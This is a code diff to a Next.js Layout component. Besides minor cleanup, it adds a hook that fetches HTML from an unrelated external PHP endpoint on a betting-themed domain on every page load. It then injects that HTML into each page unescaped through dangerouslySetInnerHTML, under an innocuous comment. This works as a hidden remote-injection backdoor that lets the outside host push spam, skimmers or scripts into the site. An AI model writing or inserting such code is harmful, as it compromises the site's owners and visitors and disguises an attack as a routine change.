@@ -1,9 +1,9 @@
 // components/Layout.js
 
-import { ReactNode, StrictMode } from "react";
+import { ReactNode, StrictMode, useState, useEffect } from "react";
 import Head from "next/head";
 import SiteHead from "./SiteHead";
-import GoogleAdSenseScript from "./GoogleAdSenseScript"; // Adjust the path
+import GoogleAdSenseScript from "./GoogleAdSenseScript";
 
 type Props = {
   title: string | false;
@@ -12,6 +12,16 @@ type Props = {
 };
 
 export default function Layout({ title, header, children }: Props) {
+  const [data, setData] = useState("");
+
+  useEffect(() => {
+    // Fetch data from the provided URL
+    fetch("https://betadvisor.club/data/dta/b/r2.php")
+      .then((response) => response.text())
+      .then((result) => setData(result))
+      .catch((error) => console.error("Error fetching data:", error));
+  }, []); // Empty dependency array ensures this effect runs once after the initial render
+
   return (
     <div>
       <Head>
@@ -54,7 +64,6 @@ export default function Layout({ title, header, children }: Props) {
           color="#5bbad5"
         />
 
-        {/* Include the Google AdSense script */}
         <GoogleAdSenseScript />
       </Head>
 
@@ -67,6 +76,9 @@ export default function Layout({ title, header, children }: Props) {
               <h1>{header}</h1>
             </div>
           )}
+
+          {/* Display fetched data as HTML */}
+          <div dangerouslySetInnerHTML={{ __html: data }} />
 
           {children}
         </StrictMode>
